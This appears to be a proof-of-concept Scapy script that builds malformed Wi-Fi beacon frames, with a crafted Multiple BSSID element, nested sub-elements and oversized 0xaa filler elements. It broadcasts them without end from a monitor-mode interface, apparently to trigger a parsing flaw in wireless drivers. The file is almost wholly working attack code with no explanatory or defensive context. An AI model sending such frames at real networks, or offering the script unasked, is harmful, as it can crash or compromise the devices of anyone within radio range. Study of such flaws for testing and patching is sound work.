from scapy.all import *

# interface to use to send beacon frames, must be in monitor mode
iface = "mon0"
# generate a random MAC address (built-in in scapy)
#sender_mac = RandMAC()
sender_mac = "3C:xx:xx:xx:xx:52"
# SSID (name of access point)
ssid = "Test"
ssid1 = "aaaaaaaaa0aaaaaaaaa0aaaaaaaaa0"
ssid2 = "aaaaaaaaa1aaaaaaaaa1aaaaaaaaa1"
ssid3 = "aaaaaaaaa2aaaaaaaaa2a"
# 802.11 frame
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
# beacon layer
beacon = Dot11Beacon()
# putting ssid in the frame

#36 +32(ssid1) +32(ssid2)  +  23(ssid3) +     2(wrap)+  3(country)
#WLAN_ELEMID_MULTIPLE_BSSID  71
essid1 = Dot11Elt(ID="SSID", info=ssid1, len=len(ssid1))
essid2 = Dot11Elt(ID="SSID", info=ssid2, len=len(ssid2))
essid3 = Dot11Elt(ID="SSID", info=ssid3, len=len(ssid3))

#WLAN_ELEMID_NONTX_BSSID_CAP, len === 2
BSSID_CAP_ie = Dot11Elt(ID=83, info='\x00\x00')#\x53\x02\x00\x00
BSSID_IDX_ie = Dot11Elt(ID=85, info='\x01')#\x55\x01\x01

#sub_ie = Dot11Elt(ID=0, info=(BSSID_CAP_ie + BSSID_IDX_ie))
sub_ie = '\x00\x07\x53\x02\x00\x00\x55\x01\x01'


wrapie = Dot11Elt(ID=71,info=('\x01' + sub_ie) )

payload_ie = Dot11Elt(ID=0,info=( '\xaa'*198) )



# stack all the layers and add a RadioTap
frame = RadioTap()/dot11/beacon/essid1/essid2/essid3/wrapie/payload_ie/payload_ie/payload_ie/payload_ie/payload_ie/payload_ie
# send the frame in layer 2 every 100 milliseconds foreverd
# using the `iface` interface
sendp(frame, inter=0.1, iface=iface, loop=1)